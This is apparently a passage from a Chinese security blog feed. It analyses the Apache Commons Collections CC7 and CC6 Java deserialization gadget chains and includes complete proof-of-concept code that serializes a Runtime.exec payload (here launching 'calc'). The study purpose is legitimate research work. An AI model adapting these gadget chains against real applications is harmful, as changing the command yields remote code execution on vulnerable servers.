<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>通过<code>lazymap</code>调用触发点</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br></pre></td></tr></table></figure><p>再通过<code>TiedMapEntry</code>类最后调用<code>Lazymap.get()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>最后使用<code>hashtable</code>的<code>put</code>方法添加元素<code>TiedMapEntry</code>对象作为入口,通过反射修改<code>table</code>表<code>key</code>值去规避本地执行，同样可以通过反射修改链转换器，操作跟cc6分析写Poc的一样，这里就用反射修改<code>key</code>值了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line"><span class="comment">//对node进行初始化</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    node = tablearray[i];</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node,TM);</span><br></pre></td></tr></table></figure><p>然后序列化，反序列化触发漏洞，得到完整POC:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        Hashtable ht=<span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(<span class="string">&quot;any&quot;</span>,<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] tablearray = (Object[])table.get(ht);</span><br><span class="line">        <span class="comment">//对node进行初始化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            node = tablearray[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node,TM);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(ht);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc7payload-1.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>执行效果：<br><img src="/posts/40ba40f0/cc7-1.png" title="执行效果"></p><h1 id="0x04、总结"><a href="#0x04、总结" class="headerlink" title="0x04、总结"></a>0x04、总结</h1><p>CC7相对于前面几个链，更换了入口，其中多层的equals方法调用，以及中间设置值绕了好一会，细节还是比较多，但理清过后还是比较容易理解，学习中间发现还有另外的延伸，能举一反三才是真正的进步。</p><h1 id="0x05、参考链接"><a href="#0x05、参考链接" class="headerlink" title="0x05、参考链接"></a>0x05、参考链接</h1><p><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>java漫谈</p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC6链学习与分析</title>
      <link href="/posts/9758c0a8.html"/>
      <url>/posts/9758c0a8.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC6也是在CC5的基础上，改变了入口，依旧单独列出来方便整理，写一起太乱了。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（版本无限制）<br>Commons Collections：3.2.1（漏洞版本在3.1-3.2.1）<br>maven项目pom.xml文件中添加依赖</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p><h1 id="0x03、分析"><a href="#0x03、分析" class="headerlink" title="0x03、分析"></a>0x03、分析</h1><p>CC6基于CC5的变式，改变了触发入口点，简述CC5的触发过程</p><h2 id="回顾CC5链"><a href="#回顾CC5链" class="headerlink" title="回顾CC5链"></a>回顾CC5链</h2><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.toString()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>将<code>TiedMapEntry</code>对象通过反射赋值给<code>BadAttributeValueExpException</code>类的<code>val</code>值，通过反序列化<code>BadAttributeValueExpException</code>类对象，调用重写<code>readObject</code>方法中的<code>val.toString()</code>。</li><li><code>val.toString()</code>调用等效于<code>TiedMapEntry.toString()</code>，即调用<code>TiedMapEntry.getValue()</code>方法，达到调用<code>lazyMap.get()</code>方法触发代码执行。</li></ul><h2 id="CC6链分析"><a href="#CC6链分析" class="headerlink" title="CC6链分析"></a>CC6链分析</h2><p>在CC5中提到，调用<code>LazyMap.get()</code>方法，找到的新的入口<code>TiedMapEntry.getValue()</code>中调用的<code>get()</code>方法</p><p><img src="/posts/9758c0a8/cc6-1.png" title="TiedMapEntry.getValue()"></p><p>然后顺势寻找<code>getValue()</code>的调用情况，<code>TiedMapEntry</code>本类中有三个方法进行了调用</p><p><img src="/posts/9758c0a8/cc6-2.png" title="调用情况"></p><p>其中CC5就是<code>BadAttributeValueExpException</code>类调用了<code>toString()</code>方法形成的新入口。</p><p>除了<code>toString()</code>方法外，还有<code>hashCode()</code>和<code>equals()</code>，<code>hashCode()</code>能联想到<code>HashMap</code>，在学CC5的时候看到这三个方法我以为就是利用<code>hashCode()</code>，结果是<code>toString()</code>的调用链。</p><h3 id="实现思路一：HashMap"><a href="#实现思路一：HashMap" class="headerlink" title="实现思路一：HashMap"></a>实现思路一：HashMap</h3><p>继续看<code>hashCode()</code>的调用联想到的<code>HashMap</code>。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="put值"></p><p><code>HashMap</code>在<code>put</code>值时，会对<code>key</code>进行<code>hash</code>操作，会调用<code>hash()</code>，其中<code>hash()</code>方法调用<code>key</code>参数的<code>hashCode()</code>方法，且key参数是可控的，为了调用<code>TiedMapEntry.hashCode()</code>，只需要将<code>TiedMapEntry</code>对象作为key传入<code>hash(Object key)</code>方法中，便能调用<code>TiedMapEntry.hashCode()</code>，达到执行代码的目的。</p><p><img src="/posts/9758c0a8/cc6-3.png" title="hash()"><br><img src="/posts/9758c0a8/cc6-4.png" title="执行效果"></p><p>执行效果：</p><p><img src="/posts/9758c0a8/cc6-5.png" title="hashCode()"></p><p>这时候就能触发代码执行了，开始想的<code>hashmap</code>也可以直接序列化，为啥就不直接把<code>hashmap</code>对象给序列化，虽然在本地会触发一次代码执行，但也算是个利用链，但在序列化和反序列化的过程发现都存在问题</p><p><img src="/posts/9758c0a8/cc6-6.png" title="报错"></p><h4 id="报错排查"><a href="#报错排查" class="headerlink" title="报错排查"></a>报错排查</h4><p>序列化过程报错<code>java.lang.ProcessImpl</code>，该对象无法序列化导出抛出异常，开始想半天也不知道这个对象是哪来的，随后进行序列化调试<br>因为是对<code>hashmap</code>对象进行的序列化，且<code>hashmap</code>重写了序列化和反序列化过程，所以直接断点重写的序列化步骤就行</p><p><img src="/posts/9758c0a8/cc6-7.png" title="断点"></p><p><code>hashmap</code>的序列化写入显示经过<code>defaultWriteObject()</code>默认的序列化写入，然后还会经过<code>internalWriteEntries()</code>序列化检查，通过断点下来给我感觉作用就是把<code>hashmap</code>放入<code>table</code>中对每个<code>Key-value</code>进行序列化写入，然后遍历每个map的元素依次序列化调用<code>defaultWriteObject()</code>方法</p><p>直接进<code>internalWriteEntries()</code>方法查看<code>Map</code>对象的情况，此时<code>table</code>中只有一个<code>key=TiedMapEntry</code>对象，该对象为我们<code>put</code>进的对象，</p><p><img src="/posts/9758c0a8/cc6-8.png" title="TM对象"></p><p>读取到<code>table</code>对象元素后进行<code>writeObject</code>写入，并判断元素类型，进入对应的序列化步骤</p><p><img src="/posts/9758c0a8/cc6-9.png" title="元素对象判断"></p><p>随后在序列化读取数据的，发现此时还存在另外一个<code>Key</code>元素，<code>key</code>值是<code>11</code>，也就是说<code>hashmap</code>的另外一个<code>map</code>中还存在一对键值对，<code>key</code>值为<code>11</code></p><p><img src="/posts/9758c0a8/cc6-10.png" title="map元素"></p><p>随后遍历到<code>key</code>值为<code>11</code>的元素后 会再次序列化，重复重写的<code>writeObject()</code>步骤去写入另一个<code>map</code>中元素</p><p><img src="/posts/9758c0a8/cc6-11.png" title="map元素"></p><p>此时序列化<code>table</code>内容就变为另外一个<code>map</code>的元素内容：<code>key</code>为<code>11</code>，<code>value</code>为<code>ProcessImpl</code>对象，随后再对<code>value</code>进行序列化写入的时候，由于<code>ProcessImpl</code>对象不可被序列化，导致抛出异常</p><p>序列化报错的原因找到了，现在就是找到为啥会多出来添加一组元素的<code>map</code>对象</p><p>由于序列化操作是已经对代码进行了编译，也就是说前面的代码已经被执行过了然后再对<code>hashmap</code>对象进行序列化，在序列化前<code>hashmap</code>的存在两个<code>map</code>，其中分别存在1组元素</p><p>回到<code>LazyMap.get()</code>这个触发点，在本地put值时会触发一次代码执行，此时的运行步骤</p><p><img src="/posts/9758c0a8/cc6-12.png" title="LazyMap.get()"></p><p>可以看到当前的<code>key</code>为<code>11</code>，为<code>TiedMapEntry</code>对象创建时传入构造方法的<code>key</code>值，会判断<code>map</code>中是否存在<code>key</code>为<code>11</code>的元素，当前由于<code>map</code>只有一个<code>TiedMapEntry</code>对象的<code>key</code>元素，不存在<code>key</code>为<code>11</code>的元素，因此会进入判断体，执行<code>factory.transform(key)</code>触发了代码执行，随后将返回来的值<code>ProcessImpl</code>对象赋值给<code>value</code>变量，然后进行<code>map.put(key，value)</code>，此时<code>key</code>为<code>11</code>，<code>value</code>为<code>TiedMapEntry</code>，因此当前<code>map</code>对象中会多出一组元素，导致序列化报错。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br></pre></td></tr></table></figure><p>同时由于本地触发了漏洞，添加了<code>map</code>元素，导致反序列化时，<code>map</code>中已经存在<code>Key</code>为<code>11</code>的元素，因此不会进入判断体，不会触发代码执行。</p><h4 id="解决序列化问题"><a href="#解决序列化问题" class="headerlink" title="解决序列化问题"></a>解决序列化问题</h4><p>因此需要将新多出来的<code>map</code>元素进行删除，对象为<code>LazyMap.decorate(map,transformerChain)</code>传递进的<code>map</code>对象</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChain);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br></pre></td></tr></table></figure><p>此时序列化就不会再报错，同时反序列化也能触发漏洞。</p><p><img src="/posts/9758c0a8/cc6-13.png" title="解决序列化问题"></p><h4 id="解决本地触发问题"><a href="#解决本地触发问题" class="headerlink" title="解决本地触发问题"></a>解决本地触发问题</h4><p>解决本地触发，可以直接把触发点制空，在put完元素后，再通过反射把触发点设置给<code>Lazymap</code>，实现方法很多，原理都是一样的，都时是通过在put值时不触发<code>Runtime.exec()</code>就行，可以先制空或者填加一个正常的<code>ConstantTransformer</code>方法都可以。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//创建一个空的链转换器</span></span><br><span class="line">Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">hm.put(TM,<span class="number">111</span>);</span><br><span class="line"><span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">map.remove(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//通过反射将触发链转换器赋值给factory变量</span></span><br><span class="line">Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(Lmap,transformerChain);</span><br></pre></td></tr></table></figure><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h4><p>解决了上面问题，再加上序列化和反序列化步骤就得到完整POC，这里也不再写构造POC过程了，根据分析就得到大部分步骤了组合起来就行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//创建一个空的链转换器</span></span><br><span class="line">        Transformer[] transformersfake = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChainfake</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformersfake);</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">        Map Lmap= LazyMap.decorate(map,transformerChainfake);</span><br><span class="line">        Map hm=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,<span class="number">11</span>);</span><br><span class="line">        hm.put(TM,<span class="number">111</span>);</span><br><span class="line">        <span class="comment">//删除map对象的新增的元素，避免序列化出错以及触发点失效</span></span><br><span class="line">        map.remove(<span class="number">11</span>);</span><br><span class="line">        Field field=LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(Lmap,transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//最后生成序列化文件，反序列化实现命令执行</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hm);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc6payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="/posts/9758c0a8/cc6-14.png" title="实现效果"></p><h4 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h4><p>在上面的所有分析都基于 新建立了一个hashmap对象去put 